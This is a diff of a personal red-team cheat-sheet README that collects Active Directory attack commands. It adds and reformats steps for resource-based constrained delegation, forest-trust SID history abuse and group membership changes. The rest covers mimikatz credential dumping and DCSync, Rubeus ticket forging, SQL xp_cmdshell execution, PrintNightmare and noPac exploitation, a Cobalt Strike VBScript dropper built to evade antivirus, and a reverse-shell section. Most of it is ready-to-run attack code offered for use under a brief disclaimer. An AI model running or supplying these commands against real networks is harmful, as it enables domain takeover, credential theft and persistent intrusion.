@@ -1,5 +1,3 @@
-# Arsenals
-
 This is my personal safe for arsenals. Feel free to refer and use at anytime. You can also refer to this [arsenals](arsenals) for any extra commands (`Ctrl+f` will definitely help)
 
 **_Disclaimer: Do not use this command for illegal use. Any action you take upon the information on this repo is strictly at your own risk_**
@@ -35,9 +33,9 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [Get SQL Instances](#get-sql-instances)
 	* [Get SQL Linked Server](#get-sql-linked-server)
 	* [Execute SQL Query and OS Command](#execute-sql-query-and-os-command)
-* **[Domain Trust Hopping](#domain-trust-hoppinh)**
+* **[Domain Trust Hopping](#domain-trust-hopping)**
 	* [Child-Parent Domain Escalation](#child-parent-domain-escalation)
-* **[Abuse Forest Trust](#abuse-forest-trust)**
+* **[Forest Trust Hopping](#forest-trust-hopping)**
 	* [SID History](#sid-history)
 	* [Shadow Principal](#shadow-principal)
 	* [Foreign Principal](#foreign-principal)
@@ -93,7 +91,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [jsp](#jsp-reverse-shell)
 
 
-## ACLs possible abuse
+# ACLs possible abuse
 ACL/ACE | Object | Permission | Abuse | ScreenShot
 --- | --- | --- | --- | ---
 **GenericAll** | User  | Full rights | [Force change user's password](#force-change-user-password), [Targeted Kerberoast](#targeted-kerberoast), Shadow Credentials | ![](./src/images/GenericAll_user.PNG)
@@ -110,7 +108,7 @@ ACL/ACE | Object | Permission | Abuse | ScreenShot
 **ExtendedRights** | Group  | Read LAPS Password | [Read LAPS Password](#read-laps-local-administrator-password) |
 **User-Force-Change-Password** | User | change user's password | [Force change user's password](#force-change-user-password) | ![](./src/images/Force-Change-User-Password.PNG)
 
-## LDAP Filters
+# LDAP Filters
 | PowerView | Description                    | LDAP Filter
 | ------------- | --------------- | ------------ |
 | `Get-DomainController`| Get current domain controller      |`(userAccountControl:1.2.840.113556.1.4.803:=8192)`|
@@ -138,7 +136,7 @@ $adsiSearcherObj.FindAll()
 ```
 _Note: These LDAP filters can be used with `[adsisearcher]` builtin function in powershell. Any extra commands can be found [here](https://mlcsec.com/active-directory-domain-enumeration-part-2). Amazing cheatsheet by [@mlcsec](https://twitter.com/mlcsec)_
 
-## Domain Enumeration
+# Domain Enumeration
 ### Forest Trust
 ```
 # Map all domain trusts
@@ -170,7 +168,7 @@ Get-DomainUser -TrustedToAuth -Properties name,msds-allowedtodelegateto
 ```
 You can abuse these delegation permission by referring [here](#unconstrained-delegation)
 
-## Constrained Language Mode (CLM) / WDAC / Device Guard
+# Constrained Language Mode (CLM) / WDAC / Device Guard
 ### CLM Enumeration
 ```
 $ExecutionContext.SessionState.LanguageMode
@@ -193,7 +191,7 @@ mimikatz# sekurlsa::minidump <Path_to_file>\lsass.dmp
 mimikatz# sekurlsa::logonpasswords
 ```
 
-## Unconstrained Delegation
+# Unconstrained Delegation
 ### Printer Bug
 Using spooler service to authenticate between domain computers(that runs spooler svc). Attackers can monitor incoming tickets with `Rubeus`.
 
@@ -220,7 +218,7 @@ mimikatz# sekurlsa::tickets /export
 Rubeus.exe ptt /ticket:ticket.kirbi
 ```
 
-## Constrained Delegation
+# Constrained Delegation
 ### s4u delegation
 This attack is possible if _msds-AllowedToDelegateTo_ is set.
 * with rc4 hash in hand
@@ -240,12 +238,20 @@ Rubeus.exe tgtdeleg /nowrap
 Rubeus.exe s4u /user:attacker /ticket:<base64-blob> /impersonateuser:administrator /msdsspn:time/dc01 /altservice:cifs,http,host /domain:contoso.local /dc:dc01.contoso.local /ptt
 ```
 
-## Resource-Based Constrained Delegation
-This attack is possible if owned user/computer object has _GenericWrite_ or write privilege to user/computer object attributes. Since we have write privilege, we can write to _msds-allowedtoactonbehalfofotheridentity_ property.
+# Resource-Based Constrained Delegation
+This attack is possible if owned user/computer object has _GenericWrite_ or write privilege to user/computer object attributes. Since we have write privilege, we can write to _msds-allowedtoactonbehalfofotheridentity_ property. There are few requirements needed in order to perform this attack.
+| Name                                              | Value       |
+| ------------------------------------------------- | ----------- |
+| Domain object with SPN set (computer/service acc) | mycomputer$ |
+| Principal's plain-text or hashes (rc4/aes-256)    | Range2022!  | 
 1. Import ADModule
 2. Set _msds-allowedtoactonbehalfofotheridentity_ to owned computer/user objects.
 	```
+	# AD-Module
 	Set-ADComputer -Identity dc01 -PrincipalsAllowedToDelegateToAccount (Get-ADComputer mycomputer)
+
+	# pywerview
+	Add-DomainObjectAcl -TargetIdentity dc01 -PrincipalIdentity mycomputer -Rights rbcd
 	```
 3. Get mycomputer$ ntlm hash or aes keys
 	```
@@ -253,13 +259,22 @@ This attack is possible if owned user/computer object has _GenericWrite_ or writ
 	```
 4. Apply s4u delegation (TGT+TGS)
 	```
+	# rubeus
 	Rubeus.exe s4u /user:mycomputer$ /rc4:<rc4/ntlm hash> /impersonateuser:administrator /msdsspn:http/dc01 /altservice:cifs /ptt
+
+	# impacket 
+	getST.py range.net/mssqlsvc:'Range2022!' -dc-ip 192.168.86.182 -spn cifs/dc01.range.net -impersonate Administrator
 	```
 
-## ACLs/ACEs Abuse
+#### References
+1. [Harmj0y's gist on abusing RBCD with PowerShell/PowerView/PowerMad](https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff)
+2. [ired.team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
+
+# ACLs/ACEs Abuse
 ### Force Change User Password
 _Note: This doesn't require you to know the owned user's credential_
 ```
+# PowerView
 Set-DomainUserPassword -Identity studentadmin -AccountPassword (ConvertTo-SecureString -AsPlainText -Force 'P@$$w0rd!')
 ```
 
@@ -276,8 +291,13 @@ Set-DomainUserPassword -Identity studentadmin -Domain contoso.local -AccountPass
 ```
 
 ### Add Users to Group
+This command will add specific principal to a group that exists in the domain. _Note that there are several tools to perform this. Below are some of the methods that can be used. Checkout this cool tool [bloodyAD](https://github.com/CravateRouge/bloodyAD)_
 ```
-Add-DomainGroupMember -Identity studentadmins -Members studentuser
+# PowerView
+Add-DomainGroupMember -Identity cadmins -Members lowpriv
+
+# net.exe
+net.exe group 'cadmins' lowpriv /add /domain
 ```
 
 ### Targeted Kerberoast
@@ -313,7 +333,7 @@ This will only possible if you have _AllExtendedRights_ permission on a computer
 Get-DomainComputer -Properties ms-mcs-admpwd
 ```
 
-## Weak GPO Permission
+# Weak GPO Permission
 ### Enumerate weak GPO Permission
 ```
 # Domain wide
@@ -332,7 +352,7 @@ New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArgumen
 gpoupdate /force
 ```
 
-## SQL Server Enumeration and Code Execution
+# SQL Server Enumeration and Code Execution
 I did most of my SQL Server Enumeration by using this [PowerUpSQL.ps1](https://github.com/NetSPI/PowerUpSQL) script. Refer to more commands in this [PowerUpSQL Cheatsheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
 ### Get SQL Instances
 This method will allow you to enumerate local or domain sql servers(if any).
@@ -364,7 +384,7 @@ Get-SQLQuery -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;''
 Get-SQLQuery -Query 'EXECUTE(''xp_cmdshell ''''whoami'''''') AT "DB-SQLSRV"'
 Invoke-SQLOSCmd -Instance DB-SQLSRV -Command "whoami"
 ```
-## Domain Trust Hopping
+# Domain Trust Hopping
 ### Child-Parent Domain Escalation
 This attack made possible since there is no security boundary between domains. Hence we could forge a golden ticket that contains _extra sid_ of a parent domain's _Enterprise Admins_. Below are the requirements to perform this attack:
 
@@ -395,18 +415,25 @@ Above steps could be automated with [raiseChild.py](https://github.com/SecureAut
 raiseChild.py -target-exec dc-1.domain.local child.domain.local/domainadm -hashes :2e8a408a8aec852ef2e458b938b8c071 -debug
 ```
 
-## Abuse Forest Trust
+# Forest Trust Hopping
 ### SID History
-1. Make sure SID History is enabled
+This attack path is only applicable when **SID Filtering is disabled** and **SID History is enabled**. You can read the in-depth [blogpost](https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d) on this by harmj0y.
+1. Check for `trustAttributes`  attribute. Make sure SID History is enabled
 	```
 	Get-DomainTrust
+	[[..snip..]]
+	TrustAttributes : TREAT_AS_EXTERNAL
+	[[..snip..]]
 	```
-If _TREAT\_AS\_EXTERNAL_ flag is set in **trustAtrributes** property, that means SID History is enabled
+If _TREAT\_AS\_EXTERNAL_ flag is set in **trustAtrributes** property, that means forst-trust is now more relaxed as stated in this [documentation](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c?redirectedfrom=MSDN)
+> _If this bit is set, then a cross-forest trust to a domain is to be treated as an external trust for the purposes of SID Filtering._ **_Cross-forest trusts are more stringently filtered than external trusts_**_. This attribute relaxes those cross-forest trusts to be equivalent to external trusts._
 
-2. Forge Inter-Realm TGT with extra sids. We injected sid of trusted domain users with RID > 1000
-	```
+2. Forge Inter-Realm TGT with extra sids. We injected sid of trusted domain users with RID > 1000. This is because most _WELL-KNOWN-SID_ is flag as _ForestSpecific_ based on the [documentation](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280) 
+>The ForestSpecific rule is for those SIDs that are never allowed in a PAC that originates from out of the forest or from a domain that has been marked as QuarantinedWithinForest, unless it belongs to that domain.
+
+```
 	mimikatz# kerberos::golden /user:administrator /domain:contoso.local /sid:<domain-sid> /rc4:<trust-key> /service:krbtgt /target:fortress.local /sids:<victim-user-sid> /ticket:<path>\ticket.kirbi
-	```
+```
 3. Asktgs with the generated kirbi ticket
 	```
 	Rubeus.exe asktgs /ticket:<path>\ticket.kirbi /service:HTTP/dc02.contose.local /dc:dc02.contoso.local /ptt
@@ -431,7 +458,7 @@ Find-ForeignUser
 Find-ForeignGroup
 ```
 
-## Lateral Movement / Post Exploitation
+# Lateral Movement / Post Exploitation
 ### Overpass-The-Hash (OPTH)
 _Note: This requires local administrator privilege_
 ```
@@ -501,7 +528,7 @@ mimikatz# lsadump::dcsync /domain:fqdn /user:krbtgt
 lsadump::dcsync /domain:contoso.local /dc:dc01 /user:administrator /authuser:dc01$ /authdomain:contoso.local /authpassword:"" /authntlm
 ```
 
-## Persistence
+# Persistence
 
 ### Golden Ticket
 A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket. The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine
@@ -613,7 +640,7 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
 	```
 You can read more from this great [article](https://skyblue.team/posts/delegate-krbtgt/) from [citronneur](https://twitter.com/citronneur). _CAVEAT: This is not really an OPSEC safe choice to perform persistence. So please be extra careful and cautious when executing the above steps_
 
-## Remote Authentication Between Computers
+# Remote Authentication Between Computers
 ### PS Remoting
 **PS Remoting** stands for PowerShell remoting, this will enable users to authenticate between powershell session in remote computers by using `*-PSSession`.
 ```
@@ -669,7 +696,7 @@ PS> $obj.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\s
 ### Reference
 * https://dolosgroup.io/blog/remote-access-cheat-sheet
 
-## Generate VBScript dropper (APC process injection)
+# Generate VBScript dropper (APC process injection)
 Make sure to download [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript.git) and [Donut](https://github.com/TheWover/donut.git)._Note:This method probably won't 100% bypass EDR/AV._
 ### Cobalt Strike Beacon
 For cobalt strike, this aggressor script called [**ShellCode Generator**](https://github.com/RCStep/CSSG) is very useful to generate shellcode with custom formatting. This cna also helps to obfuscate with XOR or AES method.
@@ -712,12 +739,12 @@ $filename='<file-path-to>\payload.bin'
 ```powershell
 wscript.exe .\realtest.vbs
 ```
-## Extra Red Teaming Tools (that i know of xD)
+# Extra Red Teaming Tools (that i know of xD)
 * [MacroPack](https://github.com/sevagas/macro_pack) - Generate obfuscated Office Macro
 * [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) - Check for signature based detection, this support AMSI check as well
 * [ADConnect Dump](https://github.com/fox-it/adconnectdump) - Dumps Azure On-Prem ADConnect
 
-## Low Hanging Fruits
+# Low Hanging Fruits
 ### ZeroLogon
 Set the computer account's password to null allowing attackers to perform [DCSync](#dcsync) attack with null authentication
 1. Run exploit script [here](https://github.com/risksense/zerologon.git)
@@ -751,7 +778,7 @@ secretsdump.py -sam SAM-file -system SYSTEM-file LOCAL
 
 Note that the above methods is the manual way. This has been implemented in a automated C# code called [HiveNightmare](https://github.com/GossiTheDog/HiveNightmare). Once you retrieve admin's ntlm, you can do lots of stuff including [changing password](https://twitter.com/gentilkiwi/status/1417467063883476992) or [Pass The Hash](#overpass-the-hash-opth)/PsExec/Evil-Winrm...
 
-## PrintNightmare
+# PrintNightmare
 Abusing printer spooler service (CVE-2021-34527) to load malicious DLL and execute as SYSTEM. Available POCs can be found here
 | Link          | Authors         |Language|
 | ------------- | ------------- | ----- |
@@ -778,7 +805,7 @@ smbserver.py smbshare `pwd` -smb2support
 python3 CVE-2021-1675.py testlab/testuser:'P@$$w0rd!'@10.10.10.10 '\\10.10.10.10\smbshare\encme.dll' [-hashes :NTLM]
 ```
 
-## noPac
+# noPac
 This exploit will require a valid domain user regardless the level of privilege given as long as it can create a computer account on the domain. Here are the steps.
 
 1. Create a fake computer with [Powermad.ps1](https://github.com/Kevin-Robertson/Powermad) script.
@@ -841,7 +868,7 @@ net computer \\FakeComputer /delete
 ### Reference 
 https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing
 
-## ADCS
+# ADCS
 
 ### PKI Abuse
 It is recommended to use below commands with `-k` option and .cacche file. Please refer [Request TGT](#request-tgt) section
@@ -1047,7 +1074,7 @@ For the details explanation of the vulnerability (CVE-2022-26923), you may read 
 * https://www.fortalicesolutions.com/posts/keeping-up-with-the-ntlm-relay
 * https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
 
-## File Transfer
+# File Transfer
 
 | **Command** | **Description** |
 | --------------|-------------------|
@@ -1063,7 +1090,7 @@ For the details explanation of the vulnerability (CVE-2022-26923), you may read 
 | `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
 | `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
 
-## Reverse Shells
+# Reverse Shells
 _Credits: These reverse shells examples are reffered to [EzpzShell](https://github.com/H0j3n/EzpzShell) by [@h0j3n](https://twitter.com/h0j3n)_
 ### php reverse shell
 You can get a full reverse shell script [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) by PentestMonkey
